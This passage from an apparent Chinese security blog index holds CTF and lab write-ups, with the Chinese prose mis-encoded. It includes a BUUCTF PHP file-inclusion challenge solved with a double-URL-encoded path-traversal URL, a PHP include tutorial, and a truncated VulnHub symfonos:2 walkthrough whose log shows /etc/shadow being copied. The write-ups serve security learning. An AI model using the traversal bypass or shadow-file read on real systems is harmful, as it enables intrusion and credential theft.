            echo &quot;you can&#39;t see it&quot;;</span><br><span class="line">                return false;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            if (in_array($page, $whitelist)) &#123;</span><br><span class="line">                return true;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            $_page &#x3D; mb_substr(</span><br><span class="line">                $page,</span><br><span class="line">                0,</span><br><span class="line">                mb_strpos($page . &#39;?&#39;, &#39;?&#39;)</span><br><span class="line">            );</span><br><span class="line">            if (in_array($_page, $whitelist)) &#123;</span><br><span class="line">                return true;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            $_page &#x3D; urldecode($page);</span><br><span class="line">            $_page &#x3D; mb_substr(</span><br><span class="line">                $_page,</span><br><span class="line">                0,</span><br><span class="line">                mb_strpos($_page . &#39;?&#39;, &#39;?&#39;)</span><br><span class="line">            );</span><br><span class="line">            if (in_array($_page, $whitelist)) &#123;</span><br><span class="line">                return true;</span><br><span class="line">            &#125;</span><br><span class="line">            echo &quot;you can&#39;t see it&quot;;</span><br><span class="line">            return false;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    if (! empty($_REQUEST[&#39;file&#39;])</span><br><span class="line">        &amp;&amp; is_string($_REQUEST[&#39;file&#39;])</span><br><span class="line">        &amp;&amp; emmm::checkFile($_REQUEST[&#39;file&#39;])</span><br><span class="line">    ) &#123;</span><br><span class="line">        include $_REQUEST[&#39;file&#39;];</span><br><span class="line">        exit;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        echo &quot;&lt;br&gt;&lt;img src&#x3D;\&quot;https:&#x2F;&#x2F;i.loli.net&#x2F;2018&#x2F;11&#x2F;01&#x2F;5bdb0d93dc794.jpg\&quot; &#x2F;&gt;&quot;;</span><br><span class="line">    &#125;  </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>è¦æƒ³è¾¾åˆ°æ–‡ä»¶åŒ…å«</p><ul><li>å˜é‡<code>$file</code>ä¸ä¸ºç©º</li><li><code>$file</code>è¦æ˜¯ä¸€ä¸ªå­—ç¬¦ä¸²</li><li>èƒ½å¤Ÿé€šè¿‡<code>emmm::checkfile</code></li></ul><h3 id="emmm-checkfile"><a href="#emmm-checkfile" class="headerlink" title="emmm:checkfile"></a>emmm:checkfile</h3><p>æƒ³è¦<code>return true</code>å°±è¦æ»¡è¶³ä»¥ä¸‹æ¡ä»¶</p><ul><li><code>$file</code>ä¸ä¸ºç©º</li><li><code>$file</code>åœ¨ä¸¤ä¸ª<code>?</code>å­—ç¬¦ä¹‹é—´çš„éƒ¨åˆ†éœ€è¦åœ¨<code>whitelist</code>é‡Œé¢</li></ul><h2 id="hint-php"><a href="#hint-php" class="headerlink" title="hint.php"></a>hint.php</h2><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag not here, and flag in ffffllllaaaagggg</span><br></pre></td></tr></table></figure><p>å‘Šè¯‰äº†<code>flag</code>å­˜æ”¾çš„ä½ç½®</p><h2 id="è§£é¢˜æ€è·¯"><a href="#è§£é¢˜æ€è·¯" class="headerlink" title="è§£é¢˜æ€è·¯"></a>è§£é¢˜æ€è·¯</h2><p>å¯¹<code>?</code>å­—ç¬¦è¿›è¡Œä¸¤æ¬¡<code>urlencode</code>å°±å¯ä»¥ç»•è¿‡<code>emmm:checkfile</code>ã€‚</p><p>åœ¨å‘é€æ•°æ®åˆ°æœåŠ¡å™¨çš„æ—¶å€™ä¼šæœ‰ä¸€æ¬¡<code>urldecode</code>ï¼Œç„¶ååœ¨<code>emmm:checkfile</code>ä¸­æœ‰ç¬¬äºŒæ¬¡è¿‡æ»¤</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;6cba0961-d475-45e3-b0ea-9040e2e31cf5.node3.buuoj.cn&#x2F;source.php?file&#x3D;source.php%253f..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;ffffllllaaaagggg</span><br></pre></td></tr></table></figure><p>è®¿é—®ä¸Šè¿°urlæ—¶ï¼ŒæœåŠ¡å™¨å°†ç¬¬ä¸€æ¬¡<code>urldecode</code>ï¼Œç»“æœå¦‚ä¸‹</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;6cba0961-d475-45e3-b0ea-9040e2e31cf5.node3.buuoj.cn&#x2F;source.php?file&#x3D;source.php%3f..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;ffffllllaaaagggg</span><br></pre></td></tr></table></figure><p>åœ¨æ‰§è¡Œ<code>source.php</code>çš„è¿‡ç¨‹ä¸­ï¼Œç¬¬äºŒæ¬¡è§£ç ä¹‹åçš„æ•°æ®ä¸º</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">source.php?..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;ffffllllaaaagggg</span><br></pre></td></tr></table></figure><p>å–åˆ°<code>?</code>å³<code>source.php</code>é€šè¿‡ç™½åå•éªŒè¯</p><p>è‡³äºä¸Šé¢çš„å¥½å¤š<code>../</code>æ˜¯ç”±äºä¸çŸ¥é“<code>flag</code>æ–‡ä»¶çš„ç›®å½•ï¼Œæ‰€ä»¥åªèƒ½ç©·ä¸¾çˆ¶çº§ç›®å½•<code>../</code></p>]]></content>
      
      
      <categories>
          
          <category> web </category>
          
          <category> buu </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> buu </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>phpä¼ªåè®®</title>
      <link href="/php_agreement.html"/>
      <url>/php_agreement.html</url>
      
        <content type="html"><![CDATA[<p>ï¼ˆè¿˜æ²¡æœ‰å¼€å§‹å†™ï¼‰</p><p>å‚è€ƒèµ„æ–™: <a href="https://segmentfault.com/a/1190000018991087">phpä¼ªåè®®æ€»ç»“</a></p><a id="more"></a>]]></content>
      
      
      <categories>
          
          <category> web </category>
          
          <category> php </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> php </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>phpä¸­çš„æ–‡ä»¶åŒ…å«</title>
      <link href="/php_fileinclude.html"/>
      <url>/php_fileinclude.html</url>
      
        <content type="html"><![CDATA[<p>phpæ–‡ä»¶åŒ…å«</p><p>å‚è§<a href="https://www.php.net/manual/zh/reserved.variables.php">phpæ‰‹å†Œ</a></p><a id="more"></a><h2 id="include"><a href="#include" class="headerlink" title="include"></a>include</h2><h3 id="ç¤ºä¾‹ç¨‹åº"><a href="#ç¤ºä¾‹ç¨‹åº" class="headerlink" title="ç¤ºä¾‹ç¨‹åº"></a>ç¤ºä¾‹ç¨‹åº</h3><h4 id="1-php"><a href="#1-php" class="headerlink" title="1.php"></a>1.php</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;hello wolrd&lt;br/&gt;&quot;</span><span class="comment">// æ¼äº†; æ˜¯é”™è¯¯çš„è¯­æ³•</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;h&lt;br/&gt;&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h4 id="2-php"><a href="#2-php" class="headerlink" title="2.php"></a>2.php</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;1.php&#x27;</span>;</span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;1.php&#x27;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;hello&lt;br/&gt;&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>è¿è¡Œ<code>2.php</code>çš„æ—¶å€™ï¼Œä¼šåœ¨<code>include</code>è¯­å¥å¤„å»æ‰¾ç›¸åº”çš„æ–‡ä»¶ï¼Œå°†å…¶åŠ è½½åˆ°<code>include</code>è¯­å¥å¤„ï¼Œå³ä½¿<code>1.php</code>åŒ…å«è¯­æ³•é”™è¯¯ï¼Œä¹Ÿä¼šæ‰§è¡Œä¸Šé¢çš„ä»£ç ï¼Œé‡åˆ°<code>1.php</code>ä¸­çš„è¯­æ³•é”™è¯¯å°±ç»ˆæ­¢</p><h3 id="include-1"><a href="#include-1" class="headerlink" title="include"></a>include</h3><p>å¯¹äº<code>include</code>ï¼Œç³»ç»Ÿç¢°åˆ°ä¸€æ¬¡å°±ä¼šè¿è¡Œä¸€æ¬¡ï¼Œå¦‚æœå¯¹åŒä¸€ä¸ªæ–‡ä»¶å¤šæ¬¡ä½¿ç”¨<code>include</code>ï¼Œä¹Ÿä¼šåŠ è½½å¤šæ¬¡</p><h3 id="include-once"><a href="#include-once" class="headerlink" title="include_once"></a>include_once</h3><p>å¯¹äº<code>include_once</code>ï¼Œå°±ç®—ç¢°åˆ°äº†å¤šæ¬¡ï¼Œä¹Ÿåªä¼šè¿è¡Œä¸€æ¬¡ï¼Œä¸ªäººè®¤ä¸ºå¦‚æœç”¨Cè¯­è¨€æ¥ç±»æ¯”çš„è¯ï¼Œå°±åƒæ˜¯åœ¨å¤´æ–‡ä»¶ä¸­å†™å…¥äº†å¦‚ä¸‹è¯­å¥</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> __xxx_H__</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __xxx_H__</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span> <span class="comment">// __xxx_H__</span></span></span><br></pre></td></tr></table></figure><h2 id="require"><a href="#require" class="headerlink" title="require"></a>require</h2><h3 id="requireå’Œincludeçš„åŒºåˆ«"><a href="#requireå’Œincludeçš„åŒºåˆ«" class="headerlink" title="requireå’Œincludeçš„åŒºåˆ«"></a><code>require</code>å’Œ<code>include</code>çš„åŒºåˆ«</h3><ul><li><p>åŠ è½½å¤±è´¥çš„å¤„ç†æ–¹å¼ä¸åŒ</p>  <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="comment">// include &#x27;1.php&#x27;;</span></span><br><span class="line"><span class="comment">// require &#x27;1.php&#x27;;</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;hello world&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>  å¦‚æœ<code>1.php</code>ä¸å­˜åœ¨</p><ul><li><code>include</code>è¦æ±‚è¾ƒä½ï¼ŒåŒ…å«å‡ºé”™ä¸å½±å“ç»§ç»­æ‰§è¡Œï¼›</li><li><code>require</code>è¦æ±‚è¾ƒé«˜ï¼ŒåŒ…å«å‡ºé”™ä»£ç å°†ä¸ä¼šç»§ç»­æ‰§è¡Œ</li></ul></li><li><p><code>include</code>æ˜¯æœ‰æ¡ä»¶åŒ…å«ï¼Œ<code>require</code>æ˜¯æ— æ¡ä»¶åŒ…å«</p>  <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="literal">FALSE</span>) &#123;</span><br><span class="line">        <span class="keyword">include</span> <span class="string">&#x27;1.php&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="literal">FALSE</span>) &#123;</span><br><span class="line">        <span class="keyword">require</span> <span class="string">&#x27;1.php&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><ul><li><code>include &#39;1.php&#39;</code>å°†ä¸ä¼šè¢«è¿è¡Œ</li><li><code>require &#39;1.php&#39;</code>å°†ä¼šè¢«è¿è¡Œ</li></ul></li><li><p><code>require</code>æ²¡æœ‰è¿”å›å€¼ï¼Œè€Œ<code>include</code>æœ‰</p>  <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$ret</span> = <span class="keyword">include</span> <span class="string">&#x27;1.php&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="variable">$ret</span>)) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;success&quot;</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;failed&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></li><li><p><code>require</code>æ˜¯é¢„å…ˆæ›¿ä»£ï¼Œæ˜¯å…ˆå°†æŒ‡å®šæ–‡ä»¶çš„å†…å®¹æ›¿æ¢å‡ºæ¥å†è¿è¡Œ</p></li></ul><h2 id="æ–‡ä»¶åµŒå¥—åŒ…å«"><a href="#æ–‡ä»¶åµŒå¥—åŒ…å«" class="headerlink" title="æ–‡ä»¶åµŒå¥—åŒ…å«"></a>æ–‡ä»¶åµŒå¥—åŒ…å«</h2><p>æœ¬è´¨å°±æ˜¯å¥—å¨ƒ</p><h3 id="ç¤ºä¾‹ç¨‹åº-1"><a href="#ç¤ºä¾‹ç¨‹åº-1" class="headerlink" title="ç¤ºä¾‹ç¨‹åº"></a>ç¤ºä¾‹ç¨‹åº</h3><h4 id="1-php-1"><a href="#1-php-1" class="headerlink" title="1.php"></a>1.php</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;hello&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h4 id="2-php-1"><a href="#2-php-1" class="headerlink" title="2.php"></a>2.php</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">include_once</span> <span class="string">&#x27;1.php&#x27;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;world&lt;br/&gt;&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h4 id="3-php"><a href="#3-php" class="headerlink" title="3.php"></a>3.php</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">include_once</span> <span class="string">&#x27;2.php&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;done&lt;br/&gt;&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>åœ¨æ‰§è¡Œ<code>3.php</code>çš„æ—¶å€™ï¼Œä¼šåŒ…å«<code>2.php</code>ï¼Œåˆä¼šç»§ç»­åŒ…å«<code>1.php</code>ï¼Œé€ æˆå¥—å¨ƒæ“ä½œ</p><blockquote><p>é‚£ä¹ˆé—®é¢˜æ¥äº†ï¼Œå¦‚æœæ„æˆäº†å¾ªç¯çš„åµŒå¥—åŒ…å«ä¼šæ€ä¹ˆæ ·</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> web </category>
          
          <category> php </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> php </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>vulnhub symfonos:2é¶æœº</title>
      <link href="/symfonos-2.html"/>
      <url>/symfonos-2.html</url>
      
        <content type="html"><![CDATA[<p>vulnhubé‡Œçš„ symfonos-2 é¶æœº</p><p>é¶æœºip:<code>192.168.2.179</code></p><p>kali:<code>192.168.2.178</code></p><a id="more"></a><h2 id="ä¸»æœºå‘ç°-amp-amp-ç«¯å£æ‰«æ"><a href="#ä¸»æœºå‘ç°-amp-amp-ç«¯å£æ‰«æ" class="headerlink" title="ä¸»æœºå‘ç°&amp;&amp;ç«¯å£æ‰«æ"></a>ä¸»æœºå‘ç°&amp;&amp;ç«¯å£æ‰«æ</h2><p>é¶æœº</p><img src="symfonos:2/image-20200808144335709.png" alt="image-20200808144335709" style="zoom:50%;" /><p>ç«¯å£æ‰«æ</p><img src="symfonos:2/image-20200808144519233.png" alt="image-20200808144519233" style="zoom:50%;" /><h2 id="smb"><a href="#smb" class="headerlink" title="smb"></a>smb</h2><p>ä½¿ç”¨<code>smbclient</code>æŸ¥çœ‹ä¸€ä¸‹å…±äº«æ–‡ä»¶å¤¹</p><img src="symfonos:2/image-20200808144625632.png" alt="image-20200808144625632" style="zoom:50%;" /><p>åº”è¯¥æ˜¯æ”¯æŒåŒ¿åç™»é™†çš„</p><p>ä½¿ç”¨<code>anonymous</code>ç™»å½•ï¼ŒæŸ¥çœ‹æ–‡ä»¶</p><img src="symfonos:2/image-20200808144853131.png" alt="image-20200808144853131" style="zoom:50%;" /><h3 id="log-txt"><a href="#log-txt" class="headerlink" title="log.txt"></a>log.txt</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br></pre></td><td class="code"><pre><span class="line">root@symfonos2:~# cat /etc/shadow &gt; /var/backups/shadow.bak</span><br><span class="line">root@symfonos2:~# cat /etc/samba/smb.conf</span><br><span class="line"><span class="meta">#</span></span><br><span class="line"><span class="bash"><span class="comment"># Sample configuration file for the Samba suite for Debian GNU/Linux.</span></span></span><br><span class="line"><span class="meta">#</span></span><br><span class="line"><span class="bash"><span class="comment">#</span></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> This is the main Samba configuration file. You should <span class="built_in">read</span> the</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> smb.conf(5) manual page <span class="keyword">in</span> order to understand the options listed</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> here. Samba has a huge number of configurable options most of <span class="built_in">which</span></span> </span><br><span class="line"><span class="meta">#</span><span class="bash"> are not shown <span class="keyword">in</span> this example</span></span><br><span class="line"><span class="meta">#</span></span><br><span class="line"><span class="bash"><span class="comment"># Some options that are often worth tuning have been included as</span></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> commented-out examples <span class="keyword">in</span> this file.</span></span><br><span class="line"><span class="meta">#</span><span class="bash">  - When such options are commented with <span class="string">&quot;;&quot;</span>, the proposed setting</span></span><br><span class="line"><span class="meta">#</span><span class="bash">    differs from the default Samba behaviour</span></span><br><span class="line"><span class="meta">#</span><span class="bash">  - When commented with <span class="string">&quot;#&quot;</span>, the proposed setting is the default</span></span><br><span class="line"><span class="meta">#</span><span class="bash">    behaviour of Samba but the option is considered important</span></span><br><span class="line"><span class="meta">#</span><span class="bash">    enough to be mentioned here</span></span><br><span class="line"><span class="meta">#</span></span><br><span class="line"><span class="bash"><span class="comment"># <span class="doctag">NOTE:</span> Whenever you modify this file you should run the command</span></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> <span class="string">&quot;testparm&quot;</span> to check that you have not made any basic syntactic</span> </span><br><span class="line"><span class="meta">#</span><span class="bash"> errors.</span> </span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">======================= Global Settings =======================</span></span><br><span class="line"></span><br><span class="line">[global]</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment"># Browsing/Identification ###</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> Change this to the workgroup/NT-domain name your Samba server will part of</span></span><br><span class="line">   workgroup = WORKGROUP</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> Windows Internet Name Serving Support Section:</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> WINS Support - Tells the NMBD component of Samba to <span class="built_in">enable</span> its WINS Server</span></span><br><span class="line"><span class="meta">#</span><span class="bash">   wins support = no</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> WINS Server - Tells the NMBD components of Samba to be a WINS Client</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> Note: Samba can be either a WINS Server, or a WINS Client, but NOT both</span></span><br><span class="line">;   wins server = w.x.y.z</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> This will prevent nmbd to search <span class="keyword">for</span> NetBIOS names through DNS.</span></span><br><span class="line">   dns proxy = no</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment">### Networking ####</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> The specific <span class="built_in">set</span> of interfaces / networks to <span class="built_in">bind</span> to</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> This can be either the interface name or an IP address/netmask;</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> interface names are normally preferred</span></span><br><span class="line">;   interfaces = 127.0.0.0/8 eth0</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> Only <span class="built_in">bind</span> to the named interfaces and/or networks; you must use the</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> <span class="string">&#x27;interfaces&#x27;</span> option above to use this.</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> It is recommended that you <span class="built_in">enable</span> this feature <span 